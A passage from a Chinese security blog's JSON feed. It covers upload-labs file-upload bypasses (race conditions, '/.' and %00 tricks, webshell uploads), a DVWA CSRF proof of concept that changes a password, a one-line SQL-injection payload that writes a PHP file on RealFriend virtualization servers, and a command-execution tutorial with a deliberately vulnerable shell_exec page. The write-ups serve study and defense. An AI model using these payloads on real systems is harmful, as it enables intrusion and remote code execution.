variable\">$file_ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>             <span class=\"token function\">rename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$upload_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>             <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"只允许上传.jpg|.png|.gif类型文件！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$upload_file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697702167311-fc03cab1-1e98-4d25-b013-708d18c6a189.png\" alt=\"img\"></p>\n<p>burp 一直上传</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697702287142-66dc2219-e99a-4ea6-a87d-b1baaac45522.png\" alt=\"img\"></p>\n<p>用浏览器一直访问这个地址访问到了因为已经打开了图片就不会删除了</p>\n<h4 id=\"第十八关-配合文件包含\"><a class=\"markdownIt-Anchor\" href=\"#第十八关-配合文件包含\">#</a> <span class=\"label warning\">第十八关  配合文件包含</span></h4>\n<p>检测了后缀其他跟 17 关步骤一样</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697703090039-47543d22-7391-42b4-9de5-9f0e063c82f4.png\" alt=\"img\"></p>\n<h4 id=\"第十九关-文件名控可控攻击方法\"><a class=\"markdownIt-Anchor\" href=\"#第十九关-文件名控可控攻击方法\">#</a> <span class=\"label warning\">第十九关 文件名控可控攻击方法</span></h4>\n<p>两种 %00 截断 和 /.</p>\n<p>比前面的多了一个保存名称 没有对上传的文件做判断 move_uploaded_file () 这样一个函数，特性是会忽略到文件末尾的 /.<br>\n 直接上传 shell.png，抓包，在末尾加上 /.</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697704411798-e4fcb279-e5b6-4b69-ae56-0107ceed22b2.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697704586053-6dd803ff-312f-48ef-a4e4-73741933ba72.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697704751240-d898a239-69cc-4429-b56f-776414fbec23.png\" alt=\"img\"></p>\n<p>%00 也可以但是要注意 php 版本</p>\n<h3 id=\"upload-labs关卡技巧\"><a class=\"markdownIt-Anchor\" href=\"#upload-labs关卡技巧\">#</a> <span class=\"label warning\">upload-labs 关卡技巧</span></h3>\n<p>upload-labs 是一个使用 php 语言编写的，专门收集渗透测试过程中遇到的各种上传漏洞的靶场。目前一共 19 关，每一关都包含着不同上传方式。具体的每一关的解题方法如下：</p>\n<p>Pass-01: 通过禁用 js 插件或修改网页源代码绕过前端检查限制，可以成功上传文件。</p>\n<p>Pass-02: 通过修改上传文件的 Content-Type 字段为允许上传的文件类型之一，绕过后端的 MIME 验证，可以成功上传文件。</p>\n<p>Pass-03: 通过上传一个以被绕过的黑名单后缀名为文件的方式，绕过后端黑名单验证，可以成功上传文件。</p>\n<p>Pass-04: 通过上传一个.htaccess 文件并设置对应的解析规则，可以将上传的文件解析为 php 文件，从而成功上传代码。</p>\n<p>Pass-05: 通过上传一个大小写混合的后缀名为文件，绕过后端大小写敏感的验证，可以成功上传文件。</p>\n<p>Pass-06: 通过在上传文件的末尾加上空格，绕过后端删除文件末尾空格的验证，可以成功上传文件。</p>\n<p>Pass-07: 通过在上传文件的末尾加上一个点，绕过后端删除文件末尾点的验证，可以成功上传文件。</p>\n<p>Pass-08: 通过在上传文件的末尾加上::$DATA，绕过后端删除文件字符串的验证，可以成功上传恶意文件。</p>\n<p>Pass-09: 通过修改文件后缀名为.php 和.，绕过后端对文件名的验证，可以成功上传文件。</p>\n<p>Pass-10: 通过修改文件后缀名为.pphphp，绕过后端的黑名单验证，可以成功上传文件。</p>\n<p>Pass-11: 通过在上传的文件被删除之前，快速访问该文件，绕过后端的删除操作，可以成功上传文件。</p>\n<p>Pass-12: 通过对上传文件进行 URL 编码，绕过后端对特殊字符的处理，可以成功上传文件。</p>\n<p>Pass-13: 通过在图片文件中添加 php 代码，实现文件包含漏洞，成功上传 webshell。</p>\n<p>Pass-14: 通过在图片文件头部添加图片文件的文件头，实现文件包含漏洞，成功上传 webshell。</p>\n<p>Pass-15: 通过启用 php_exif 扩展，并在图片文件中添加 php 代码，成功上传 webshell。</p>\n<p>Pass-16: 通过在图片动态渲染的过程中，找到不被渲染的地方，添加 php 代码，成功上传 webshell。</p>\n<p>Pass-17: 通过在文件上传的过程中，使用条件竞争，绕过后端的删除操作，可以成功上传文件。</p>\n<p>Pass-18: 通过修改 18 关的 myupload.php 文件并重启靶场，绕过后端的文件保存路径验证，可以成功上传文件。</p>\n<p>Pass-19: 通过在上传的文件名末尾添加 /，绕过后端对文件后缀名的验证，可以成功上传文件。</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/05/%E6%BC%8F%E6%B4%9E/csrf%E6%BC%8F%E6%B4%9E/",
            "url": "http://gyzero.shop/2023/11/05/%E6%BC%8F%E6%B4%9E/csrf%E6%BC%8F%E6%B4%9E/",
            "title": "CSRF漏洞",
            "date_published": "2023-11-05T13:15:07.000Z",
            "content_html": "<h3 id=\"漏洞原理\"><a class=\"markdownIt-Anchor\" href=\"#漏洞原理\">#</a> <span class=\"label info\">漏洞原理</span></h3>\n<p>CSRF（跨站请求伪造）漏洞是一种 Web 应用程序安全漏洞，它允许攻击者通过利用受害者的已认证会话来执行未经授权的操作。攻击者通常会欺骗受害者执行某个恶意请求，而受害者并不知情。这种攻击通常发生在用户已登录到 Web 应用程序的情况下，攻击者利用受害者的身份来执行操作，如更改密码、发起转账、修改个人资料等。</p>\n<p>CSRF 攻击的基本原理是，攻击者构建一个恶意的请求，将其嵌入到一个看似无害的网页中，然后诱使受害者访问该网页。当受害者访问这个页面时，他们的浏览器会自动发送请求到受攻击的 Web 应用程序，以当前已认证的用户身份执行该请求。这就意味着攻击者可以执行一系列未经授权的操作。</p>\n<h3 id=\"漏洞攻击\"><a class=\"markdownIt-Anchor\" href=\"#漏洞攻击\">#</a> <span class=\"label info\">漏洞攻击</span></h3>\n<p>DVWA 演示</p>\n<p>更改密码抓取数据包</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20231105215507531.png\" alt=\"image-20231105215507531\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20231105215626359.png\" alt=\"image-20231105215626359\"></p>\n<p>然后复制为 csrf POC</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.dvwa.com/vulnerabilities/csrf/?password_new=1234567<span class=\"token entity named-entity\" title=\"&amp;\">&amp;amp;</span>password_conf=1234567<span class=\"token entity named-entity\" title=\"&amp;\">&amp;amp;</span>Change=Change<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>GET<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form1<span class=\"token punctuation\">\"</span></span>  <span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password_new<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1234567<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password_conf<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1234567<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Change<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Change<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Submit request<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">history<span class=\"token punctuation\">.</span><span class=\"token function\">pushState</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1neXplcm8tOW03aWdsNTYyYW1rYnQ5Zmsxa2pyYzIyMWIyaGF5NGxmeDBiZ29oZzgxbHJ6MGQ4eWUuc2hvcC9jYy5odG1sJUU5JUExJUI1JUU5JTlEJUEyJUU0JUI4JUJBJUU0JUI4JThC\">创建一个页面放在自己服务器发布 gyzero.shop/cc.html 页面为下</span></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20231105220033636.png\" alt=\"image-20231105220033636\"></p>\n<p>然后发给受害者如果受害者当前浏览器登陆了 DVWA 点击了此按钮密码就会被更改为 1234567</p>\n<p>当前密码为 admin</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20231105220600756.png\" alt=\"image-20231105220600756\"></p>\n<p>点击后再登陆</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20231105220811275.png\" alt=\"image-20231105220811275\"></p>\n<p>密码已经被更改了</p>\n<h3 id=\"csrf防御\"><a class=\"markdownIt-Anchor\" href=\"#csrf防御\">#</a> <span class=\"label info\">CSRF 防御</span></h3>\n<p>为了防止 CSRF 攻击，开发人员可以采取以下措施：</p>\n<ol>\n<li>随机生成令牌：在每个用户会话中生成一个随机的 CSRF 令牌，将其与每个请求一起发送，然后在服务器端验证令牌的有效性。这样，攻击者无法构造有效的 CSRF 请求，因为他们无法获得合法的 CSRF 令牌。</li>\n<li>启用 SameSite 属性：Web 开发人员可以使用 Cookie 的 SameSite 属性，以控制 Cookie 是否可以在跨站点请求中发送。通常，将 Cookie 的 SameSite 属性设置为 &quot;Strict&quot; 或 &quot;Lax&quot; 可以有效减轻 CSRF 攻击。</li>\n<li>验证请求来源：服务器可以验证请求的来源，确保请求是来自合法的域名，而不是恶意网站。</li>\n<li>需要双重身份验证：对于敏感操作，应要求用户进行双重身份验证，以确保用户确认他们的操作。</li>\n<li>对敏感操作使用 POST 请求：使用 POST 请求来执行敏感操作，因为 CSRF 攻击通常使用 GET 请求。</li>\n<li>定期审查代码：定期审查应用程序的代码，以检查是否存在潜在的 CSRF 漏洞。</li>\n</ol>\n<p>CSRF 漏洞可能对 Web 应用程序的安全性构成威胁，因此开发人员应该采取适当的措施来防止它们。同时，用户也应该保持警惕，不要轻易点击或访问不信任的链接，以减少成为 CSRF 攻击的受害者的风险。</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/02/%E6%BC%8F%E6%B4%9E%E9%9B%86/%E6%BC%8F%E6%B4%9E%E9%9B%86/",
            "url": "http://gyzero.shop/2023/11/02/%E6%BC%8F%E6%B4%9E%E9%9B%86/%E6%BC%8F%E6%B4%9E%E9%9B%86/",
            "title": "瑞友应用虚拟化系统rce",
            "date_published": "2023-11-02T01:11:07.000Z",
            "content_html": "<p>瑞友天翼应用虚拟化系统 RCE 漏洞</p>\n<p>通过 SQL 注入写入后门文件进行代码执行</p>\n<p>影响版本<br>\n 5.x&lt;=version&lt;=7.0.2.1<br>\n 安全版本<br>\n version&gt;=7.0.3.1</p>\n<p><strong>/RapAgent.xgi?CMD=GetRegInfo</strong> 查看版本</p>\n<p>payload:<span class=\"exturl\" data-url=\"aHR0cDovL3h4eC54eHgueHh4Lnh4eC9SYXBBZ2VudC54Z2k/Q01EPS0xJTI3K3VuaW9uK3NlbGVjdCsxJTJDJTI3JTNDJTNGcGhwK3BocGluZm8lMjglMjklM0IlM0YlM0UlMjcraW50bytvdXRmaWxlKyUyMkMlM0ElNUMlNUNQcm9ncmFtJTVDK0ZpbGVzJTVDKyU1QyUyOHg4NiU1QyUyOSU1QyU1Q1JlYWxGcmllbmQlNUMlNUNSYXAlNUMrU2VydmVyJTVDJTVDV2ViUm9vdCU1QyU1Q2FkbWluLnBocCUyMistLSstJmFtcDtjbWQ9VXNlckxvZ2lu\">http://xxx.xxx.xxx.xxx/RapAgent.xgi?CMD=-1’+union+select+1%2C’&lt;%3Fphp+phpinfo()%3B%3F&gt;'+into+outfile+“C%3A\\\\Program\\+Files\\+\\(x86\\)\\\\RealFriend\\\\Rap\\+Server\\\\WebRoot\\\\admin.php”+--+-&amp;cmd=UserLogin</span>&quot;</p>\n<p>写 phpinfo 创建 admin.php</p>\n<p>访问 admin.php</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/01/%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "url": "http://gyzero.shop/2023/11/01/%E6%BC%8F%E6%B4%9E/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/",
            "title": "命令执行漏洞",
            "date_published": "2023-11-01T12:51:01.000Z",
            "content_html": "<h3 id=\"漏洞描述\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述\">#</a> <span class=\"label info\">漏洞描述</span></h3>\n<p>命令执行漏洞（Command Execution Vulnerability），也被称为代码注入漏洞，是一种常见的安全漏洞类型，它允许攻击者在受影响的应用程序或系统中执行恶意命令。这种漏洞通常发生在那些未能正确验证和过滤用户输入数据的应用程序中，尤其是涉及用户输入的命令执行过程。</p>\n<p>攻击者可以利用命令执行漏洞来执行系统命令、操作系统脚本或其他恶意代码，从而获取未授权的访问权限、窃取敏感信息、破坏系统功能，甚至控制整个系统。这种漏洞可能会导致严重的数据泄露、拒绝服务攻击或滥用系统资源。</p>\n<h3 id=\"常见函数\"><a class=\"markdownIt-Anchor\" href=\"#常见函数\">#</a> <span class=\"label info\">常见函数</span></h3>\n<p>导致命令执行漏洞的系统命令执行函数通常是那些允许执行外部系统命令的函数。以下是一些常见的导致命令执行漏洞的函数：</p>\n<ul>\n<li>system () 函数 (有回显)<strong>：</strong> PHP 中的 system () 函数用于执行系统命令，并返回命令的输出。如果用户输入未经适当过滤，攻击者可以通过注入恶意命令来执行任意系统命令。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>exec () 函数 (回显最后一行 - 必须 echo 输出)：exec () 函数类似于 system ()，允许执行系统命令，但它返回命令的最后一行输出。同样，不正确处理用户输入可能导致漏洞。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>shell_exec () 函数（无回显）：这个函数用于执行系统命令并返回命令的完整输出。它也容易受到命令执行漏洞的威胁。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$input</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls <span class=\"token interpolation\"><span class=\"token variable\">$input</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>passthru () 函数 (有回显)：passthru () 函数执行系统命令并将命令的输出直接发送到浏览器。如果用户输入未经验证，攻击者可以注入恶意命令来直接影响浏览器输出。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>backticks (`)：在 PHP 中，反引号（反引号）可以用来执行系统命令。攻击者可以在反引号内插入任意命令。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$input</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> <span class=\"token string backtick-quoted-string\">`$input`</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>proc_open () 函数：这个函数用于创建进程，并可以执行系统命令。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$descriptorspec</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token number\">0</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"pipe\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token number\">1</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"pipe\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$process</span> <span class=\"token operator\">=</span> <span class=\"token function\">proc_open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$descriptorspec</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pipes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>eval () 函数：虽然不是专门用于执行系统命令，但 eval () 函数用于执行动态生成的 PHP 代码，因此如果不谨慎使用，也可能导致命令执行漏洞。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><div class=\"note info\">\n<p>上述函数在处理用户输入时需要特别小心，确保适当的验证和过滤，或者尽量避免使用它们，以减少潜在的命令执行漏洞风险。建议使用参数化命令、白名单验证和安全的输入处理来防止这些漏洞。</p>\n</div>\n<h3 id=\"代码分析\"><a class=\"markdownIt-Anchor\" href=\"#代码分析\">#</a> <span class=\"label info\">代码分析</span></h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'GET'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// 从 GET 参数中获取用户提供的命令</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$command</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">// 执行用户提供的命令并获取命令的输出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">// 将命令的输出显示在页面上</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Command Output:&lt;pre><span class=\"token interpolation\"><span class=\"token variable\">$output</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">// 如果未提供命令参数，显示提示信息</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Please provide a command using the \"cmd\" parameter.'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这个示例创建一个简单的 PHP 页面，它接受名为 “cmd” 的 GET 参数，并将其用作系统命令的一部分，然后将命令的输出显示在页面上。这种做法是非常危险的，因为用户可以输入任何系统命令，导致潜在的命令执行漏洞。</p>\n<p>在实际应用中，绝对不要以这种方式处理用户输入，因为它允许攻击者执行恶意命令。应该进行适当的验证、过滤和参数化命令，以确保用户输入不会被误解为可执行代码。</p>\n<h3 id=\"命令执行基础\"><a class=\"markdownIt-Anchor\" href=\"#命令执行基础\">#</a> <span class=\"label info\">命令执行基础</span></h3>\n<h4 id=\"多条命令执行\"><a 